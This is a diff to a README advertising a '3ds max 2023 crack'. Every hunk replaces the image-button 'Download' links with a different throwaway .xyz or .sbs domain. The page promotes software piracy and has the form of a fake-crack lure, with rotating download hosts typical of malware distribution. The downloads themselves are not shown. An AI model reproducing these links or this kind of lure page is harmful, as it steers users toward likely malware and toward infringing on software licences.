@@ -4,7 +4,7 @@ Unleash the power of innovation with **3ds max 2023 crack**, a cutting-edge solu
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://mercolupoz.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -34,7 +34,7 @@ Ready to elevate your workflow? Get started today with **3ds max 2023 crack**!
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://kerbrtonoped.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -48,7 +48,7 @@ Ready to elevate your workflow? Get started today with **3ds max 2023 crack**!
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -115,7 +115,7 @@ Installing **3ds max crack** is straightforward:
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
+<a href='https://gerpetouset.sbs?store=3d-max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
 
 </div>
 
@@ -133,7 +133,7 @@ Getting started with **3ds max crack** is easy:
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
+<a href='https://gerpetouset.sbs?store=3d-max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -246,7 +246,7 @@ This application is licensed under the MIT License - see the LICENSE file for de
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://mercolupoz.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -279,6 +279,6 @@ Explore our tools, connect with the community, and enjoy seamless support. Click
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/1.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/1.jpg' alt='Download' width='200'/></a>
 
 </div>
